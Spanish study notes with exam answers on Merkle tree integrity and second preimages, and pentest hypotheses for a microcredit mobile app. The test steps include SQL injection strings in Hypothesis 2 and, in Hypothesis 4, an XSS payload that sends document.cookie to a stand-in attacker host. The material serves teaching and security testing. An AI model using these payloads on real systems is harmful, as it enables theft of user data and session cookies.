Para este tipo de problemas, se utiliza una construcción llamada Merkle Tree, que consiste en un un árbol donde cada hoja lleva el resultado de aplicar la función de hash a un subconjunto del mensaje, y cada nodo lleva el resultado de aplicar la función de hash a sus nodos hijos inmediatos. El siguiente ejemplo muestra un árbol binario, con un mensaje dividido en 4 partes:

![Screenshot 2026-02-21 at 22.19.56.png](attachment:bb81bcbe-a56d-4317-9baa-9f48302706fb:Screenshot_2026-02-21_at_22.19.56.png)

En este caso, `H0 = h(H0-0 || H0-1)`, `H1 = h(H1-0 || H1-1)` y `Top Hash = h(H0 || H1)`  
Suponiendo que la función de hash utilizada es libre de colisiones, explicar:

1. ¿Por qué para verificar la integridad del bloque 001, solo es necesario calcular H0-1? (0.5 puntos)
    
    Para verificar la integridad de un bloque individual, solo necesitás recalcular el hash de ese bloque y compararlo con el valor almacenado en el árbol. H0-1 = h(data block 001), así que calculás h(bloque 001) y lo comparás con H0-1.
    
    Sin embargo, verificar solo H0-1 no garantiza integridad por sí solo — necesitás además recorrer el camino hasta el Top Hash para confirmar que H0-1 no fue manipulado. Para eso necesitás los "hermanos" del camino: H0-0 (para calcular H0) y H1 (para calcular Top Hash). Comparás el Top Hash calculado con el que tenés guardado como referencia de confianza. Si coincide, el bloque 001 es auténtico.
    
    El punto es que solo necesitás calcular **un hash de hoja** (H0-1) más O(log n) hashes del camino, en vez de recalcular los hashes de todos los bloques del mensaje.
    
2. ¿Por qué para verificar la segunda mitad del mensaje NO alcanza con verificar H1-0 y H1-1? (0.5 puntos)
    
    Porque H1-0 y H1-1 no son valores de confianza por sí solos. Un atacante podría:
    
    1. Reemplazar los bloques 010 y 011 con datos falsos
    2. Recalcular H1-0' = h(bloque_falso_010) y H1-1' = h(bloque_falso_011)
    3. Presentar los bloques falsos junto con los hashes falsos
    
    Si solo verificás que h(bloque_010) == H1-0' y h(bloque_011) == H1-1', ambas verificaciones pasan porque el atacante recalculó los hashes consistentemente. No detectás la manipulación.
    
    Para detectarla necesitás **subir hasta el Top Hash**, que es el único valor de confianza (tu ancla de integridad):
    
    4. Calcular H1' = h(H1-0' || H1-1')
    5. Calcular Top Hash' = h(H0 || H1')
    6. Comparar Top Hash' con el Top Hash guardado
    
    Si el atacante modificó cualquier bloque, el Top Hash no va a coincidir. Sin llegar hasta la raíz, no tenés garantía de integridad.
    
3. Un Merkle Tree, sin más modificaciones, puede no ser resistente a segundas preimágenes. ¿Qué condiciones se tienen que dar para que el mensaje `M’=H0-0 || H0-1 || H1-0 || H1-1` resulte en el mismo Top Hash? (1 punto)
    
    El ataque funciona así: el mensaje original tiene 4 bloques de datos y genera el árbol:
    
    `Original (4 hojas): Hojas: h(Bl.0)=H0-0 h(Bl.1)=H0-1 h(Bl.2)=H1-0 h(Bl.3)=H1-1 Nivel 1: H0 = h(H0-0 || H0-1) H1 = h(H1-0 || H1-1) Raíz: Top Hash = h(H0 || H1)`
    
    El atacante propone M' como un mensaje de 2 bloques, donde usa los hashes de las hojas originales como datos crudos:
    
    `M' (2 hojas): Bloque A = H0-0 || H0-1 Bloque B = H1-0 || H1-1 Hojas: h(H0-0 || H0-1)=H0 h(H1-0 || H1-1)=H1 Raíz: Top Hash = h(H0 || H1) ← MISMO TOP HASH`
    
    Dos mensajes distintos, mismo Top Hash. Esto es una segunda preimagen.
    
    **La condición** para que funcione es que el árbol no distinga entre nodos hoja (hash de datos reales) y nodos internos (hash de hashes intermedios). El árbol aplica h() ciegamente a lo que recibe, sin saber si es un dato o un hash. Por eso el atacante puede intercambiar un nivel de datos por hashes intermedios y obtener el mismo resultado.
    
    **La solución** es agregar un prefijo distinto según el tipo de nodo:
    
    - Hojas: `h(0x00 || datos)`
    - Nodos internos: `h(0x01 || hijo_izq || hijo_der)`
    
    Con esto, el atacante no puede hacer el swap porque `h(0x00 || H0-0 || H0-1) ≠ h(0x01 || H0-0 || H0-1)`, y el Top Hash resultante sería distinto.
    
4. Si alguien pudiera encontrar una segunda preimagen de alguno de los bloques, podría generar una segunda preimagen del Top Hash. Explicar cómo haría esto, y por qué no representa una debilidad en la primitiva. (1 punto)
    
    **Cómo lo haría:**
    
    Supongamos que el atacante encuentra una segunda preimagen del Bloque 0: un bloque falso tal que h(bloque_falso) = h(Bloque 0) = H0-0.
    
    A partir de ahí, toda la cadena hacia arriba se mantiene:
    
    1. H0-0 no cambia (porque h(bloque_falso) = H0-0)
    2. H0 = h(H0-0 || H0-1) no cambia (porque H0-0 no cambió)
    3. Top Hash = h(H0 || H1) no cambia
    
    El atacante tiene un mensaje distinto (con bloque_falso en vez de Bloque 0) que produce exactamente el mismo Top Hash. Logró una segunda preimagen del Top Hash.
    
    **¿Por qué no es una debilidad de la construcción?**
    
    Porque la debilidad no está en el Merkle Tree sino en la función de hash subyacente. Si el atacante puede encontrar una segunda preimagen de h (es decir, encontrar x' ≠ x tal que h(x') = h(x)), la función de hash ya está rota — no es resistente a segundas preimágenes.
    
    El Merkle Tree asume que la función de hash es resistente a segundas preimágenes. Si esa premisa se cumple, encontrar un bloque falso con el mismo hash es computacionalmente inviable. Si la premisa no se cumple, el problema es la función de hash, no el árbol.
    
    Es lo mismo que decir: "si alguien rompe AES, entonces AES-GCM no es seguro". Eso no es una debilidad de GCM, es una debilidad de AES. La construcción es tan segura como sus primitivas.
    

# Ejercicio de Final Random

Una empresa se dedica a gestionar microcréditos. Los usuarios registrados pueden invertir dinero, obteniendo una renta similar a un plazo fijo, o pueden solicitar pequeños préstamos y pagando una tasa de interés por los mismos.  
Para realizar todas las operaciones, la empresa desarrolló una **aplicación nativa mobile**.

Se sabe que

- La aplicación se comunica con el servidor mediante un **API REST** propietaria que está correctamente protegida.
- La aplicación requiere que el usuario se registre con un email y una contraseña.
- Sin autenticarse en la aplicación, se puede ver un resumen de la cantidad de créditos otorgados, la tasa promedio pagada y las últimas 10 operaciones concretadas (solo el tipo de operación, monto y condiciones, no a quién le fue otorgado el préstamo).
- Para invertir dinero, se puede utilizar una tarjeta de crédito o una cuenta bancaria. Es necesario registrar los datos del medio a utilizar.
- Los ingresos y salidas de dinero están gestionados por un sistema de pagos externo, DummyPay (que se llame Dummy no significa que es malo, es solo un nombre), que es quien procesa las operaciones y se hace cargo de la gestión de fraude. El proveedor disponibiliza un API para llevar a cabo las transacciones. La aplicación obtiene los valores necesarios y **ejecuta directamente llamadas al API del proveedor** a la hora de efectuar los movimientos.
- La aplicación notifica por email cuando una inversión o la cuota de un préstamo vence.

Ante un pedido de realizar un pentest que abarque la app, establecer 4 hipótesis de falla pertinentes para el caso, basadas en problemas de seguridad en aplicaciones. Explicar, para cada una, cómo probarla según la metodología (4 puntos, 1 punto cada uno).

- la app ejecuta directamente llamadas al API del proveedor → posible ataque MITM
    - prueba: configurar un emulador e instalar un proxy y su certificado en el emulador. al abrir la app y realizar una transaccion, si el proxy puede interceptar trafico HTTPS singifica que no hay certificate pinning y por lo tanto puede exponer la API key.
    - aunque la API REST está correctamente protegida, los datos en tránsito puede que no lo estén.
- si se puede ver un resumen de cantidad de créditos, etc. etc. y sin necesidad de autenticación esto implica que detrás de este resumen hay una query sql que se está realizando para traer todos esos datos sobre las operaciones
    - posible DoS → no se va a probar pero si cambiamos las ultimas 10 operaciones concretadas a las ultimas 100
    - podemos modificar la query sql que se está realizando detrás para traer datos sensibles sobre como a quién realmente se está haciendo la transacción → BROKEN ACCESS CONTROL pues un usuario no autorizado podría ver información sensible sin autorización, por falta de parametrización de la consulta
- notificación por email → podemos falsificar el email?

### HIPÓTESIS 1: Falta de certificate pinning → Exposición de datos financieros y API key de DummyPay

**Hipótesis:** La aplicación móvil se comunica directamente con la API de DummyPay para efectuar movimientos de dinero. Si la app no implementa certificate pinning, un atacante puede interceptar todo el tráfico entre la app y DummyPay. Lo crítico es que el enunciado dice que la app "ejecuta directamente llamadas al API del proveedor", lo cual implica que la API key de DummyPay está embebida en la app o viaja en los requests, y que los datos financieros (número de tarjeta, cuenta bancaria, montos) pasan por la app en tránsito hacia DummyPay.

**Prueba:** Configurar un emulador Android/iOS con un proxy (Burp Suite) e instalar el certificado del proxy en el dispositivo. Abrir la app e iniciar una operación de inversión con tarjeta de crédito. Si el proxy intercepta el tráfico HTTPS hacia DummyPay, verificar: (1) si la API key de DummyPay viaja en los headers o parámetros, (2) si los datos de la tarjeta viajan en texto plano dentro del request. Si la app no rechaza el certificado del proxy, no hay certificate pinning y todo ese tráfico queda expuesto.

**Impacto:** El atacante obtiene la API key de DummyPay (podría ejecutar transacciones a nombre de la empresa), datos de tarjetas de crédito y cuentas bancarias de los usuarios, y montos/destinos de las operaciones.

---

### HIPÓTESIS 2: SQL Injection en endpoint público de operaciones

**Hipótesis:** El endpoint público que muestra las últimas 10 operaciones concretadas funciona sin autenticación y probablemente tiene parámetros que se traducen en queries a la base de datos (por ejemplo un `limit`, un filtro por tipo de operación, o un rango de fechas). Si estos parámetros no están parametrizados, un atacante podría inyectar SQL para extraer datos que no deberían ser públicos, como la identidad de quienes recibieron los préstamos.

**Prueba:** Examinar los requests que genera la app al cargar el resumen público (usando el proxy de la hipótesis 1 o inspeccionando el tráfico de red). Identificar parámetros como `?limit=10` o `?tipo=credito`. Inyectar SQL en esos parámetros, por ejemplo: `?limit=10 UNION SELECT email, monto, destino FROM operaciones; --`. Verificar si la respuesta incluye datos que normalmente no se muestran (como el email o nombre del prestatario). Como prueba menos intrusiva, probar `?limit=10' OR '1'='1` y verificar si devuelve más de 10 resultados.

**Impacto:** Un atacante no autenticado podría extraer datos sensibles de todos los usuarios: emails, montos de préstamos, datos de inversiones, comprometiendo la privacidad financiera de los clientes.

---

### HIPÓTESIS 3: Broken Access Control en operaciones de otros usuarios

**Hipótesis:** La API REST maneja operaciones de inversión y préstamos identificadas por IDs. Si los endpoints solo verifican que el usuario esté autenticado pero no que sea el dueño de la operación, un usuario podría acceder a información de operaciones de otros usuarios manipulando los IDs en los requests.

**Prueba:** Loguearse como usuario, realizar una inversión, e interceptar el request con un proxy. Observar la URL, por ejemplo `GET /api/operaciones/1001`. Cambiar el ID a `GET /api/operaciones/1002`, `GET /api/operaciones/1003`, etc. Si el servidor devuelve datos de operaciones que no pertenecen al usuario (montos, condiciones, datos del prestatario), la hipótesis se confirma. También probar con endpoints de detalle: `GET /api/prestamos/{id_ajeno}` y `GET /api/inversiones/{id_ajeno}`.

**Impacto:** Un usuario podría ver los montos, condiciones y estado de préstamos e inversiones de otros usuarios. En el peor caso, si las acciones también están desprotegidas, podría modificar operaciones ajenas.

---

### HIPÓTESIS 4: XSS a través de emails de notificación

**Hipótesis:** La aplicación notifica por email cuando una inversión o cuota de préstamo vence, incluyendo probablemente datos de la operación. Si algún campo controlado por el usuario (como el nombre del usuario, o una descripción/referencia de la operación) se incluye en el email sin sanitizar, un atacante puede inyectar HTML/JavaScript que se ejecuta cuando la víctima abre el email en un cliente web (Gmail, Outlook web).

**Prueba:** Registrarse con un nombre que contenga script: `<script>fetch('<https://atacante.com/?c='+document.cookie>)</script>`. Realizar una operación (inversión o préstamo) y esperar a recibir la notificación por email. Verificar si el email renderiza el HTML/script sin sanitizar. Si el nombre aparece tal cual en el email y el script se ejecuta al abrirlo en un webmail, la hipótesis se confirma.

**Impacto:** El atacante podría ejecutar código en el navegador de la víctima al abrir el email, robando cookies del webmail o redirigiendo a páginas de phishing que imiten el login de la aplicación de microcréditos.

---

### HIPÓTESIS 5 (alternativa): Sensitive Data Exposure — Datos de medios de pago en la app

**Hipótesis:** El enunciado dice que el usuario debe "registrar los datos del medio a utilizar" (tarjeta o cuenta bancaria) y que la app "ejecuta directamente llamadas al API de DummyPay". Esto implica que la app captura y posiblemente almacena localmente los datos de la tarjeta o cuenta bancaria (al menos temporalmente) para poder enviarlos a DummyPay. Si esos datos quedan en almacenamiento local de la app (SharedPreferences en Android, Keychain/UserDefaults en iOS, caché, logs), un atacante con acceso físico al dispositivo o con otra app maliciosa podría extraerlos.

**Prueba:** Instalar la app en un emulador con root/jailbreak. Registrar un medio de pago (tarjeta de crédito). Luego inspeccionar el sistema de archivos de la app: SharedPreferences, bases de datos SQLite locales, archivos de caché, y logs. Buscar si aparecen datos de tarjeta (número completo, CVV, fecha de vencimiento) almacenados en texto plano o con cifrado débil.

**Impacto:** Datos financieros de los usuarios expuestos localmente, violando regulaciones PCI-DSS. Un atacante con acceso al dispositivo (o vía malware) obtiene números de tarjeta completos.

---

### HIPÓTESIS 6 (alternativa): Improper Authentication — Falta de política de contraseñas y rate limiting

**Hipótesis:** El registro es con email y contraseña, sin mención de MFA, política de contraseñas ni limitación de intentos. Si el sistema acepta contraseñas débiles y no limita intentos de login, un atacante puede realizar ataques de fuerza bruta o diccionario para acceder a cuentas ajenas. Esto es particularmente grave en una app financiera donde el acceso a la cuenta permite operar con dinero.

**Prueba:** Intentar registrarse con contraseñas débiles como "123456" o "password". Si el sistema las acepta, la política es insuficiente. Luego, realizar 20 intentos de login con contraseñas incorrectas para verificar si hay rate limiting o bloqueo de cuenta. Si no hay restricción, un ataque por diccionario es viable.

**Impacto:** Acceso a cuentas de usuarios con contraseñas débiles, permitiendo operar inversiones y préstamos en su nombre.

---

### HIPÓTESIS 7 (alternativa): Falsificación de operaciones desde la app

**Hipótesis:** Como la app llama directamente a la API de DummyPay, los parámetros de la transacción (monto, destino, tipo de operación) se arman en el cliente. Si el servidor no valida estos parámetros server-side antes de confirmar la operación, un atacante puede modificarlos con un proxy: cambiar el monto de un préstamo, alterar la tasa de interés, o redirigir una transferencia.

**Prueba:** Con el proxy activo, iniciar una inversión por $1000. Interceptar el request antes de que llegue a DummyPay y modificar el monto a $1 (para pagar menos) o modificar la cuenta destino. Verificar si el sistema acepta la operación modificada sin validación server-side.

**Impacto:** Un atacante podría obtener préstamos con condiciones manipuladas, invertir montos incorrectos, o redirigir fondos.